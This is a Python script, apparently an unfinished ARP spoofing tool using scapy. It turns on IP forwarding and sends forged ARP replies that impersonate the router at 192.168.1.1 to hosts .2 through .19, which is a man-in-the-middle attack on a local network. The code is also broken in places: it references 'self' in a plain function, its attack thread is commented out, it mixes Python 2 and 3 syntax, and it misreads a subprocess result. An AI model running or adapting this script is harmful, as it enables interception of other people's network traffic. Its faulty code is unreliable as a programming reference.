#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
from threading import Thread
import subprocess
import signal
import sys

conf.iface='eth0'

def forward_ip(enabled=True):
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fw:
        val = '1' if enabled else '0'
        ret = subprocess.Popen(['echo', val], stdout=fw)
        if ret == 1:
            logging.error('ERROR SETTING IP FORWARDING')
            sys.exit(1)

def spoof(victim, gateway):
    packet = ARP()
    packet.psrc = gateway
    packet.pdst = victim

    print("Spoofing: {0}".format(self.packet.pdst))
    try:
        while True:
            send(self.packet, verbose=0)
            sleep(5)
    except:
        pass

def main():
    base = '192.168.1.'
    router = base + '1'
    targets = map(lambda x: base + str(x), range(2,20))

    forward_ip()

    for ip in targets:
        #Thread(target=spoof, args=(ip,router,)).start()
        print ip


if __name__ == '__main__':
    logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)
    if os.geteuid() != 0:
        logging.info("[-] You must be root")
        sys.exit(1)

    def signal_handler(signal, frame):
        forward_ip(False)
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    main()
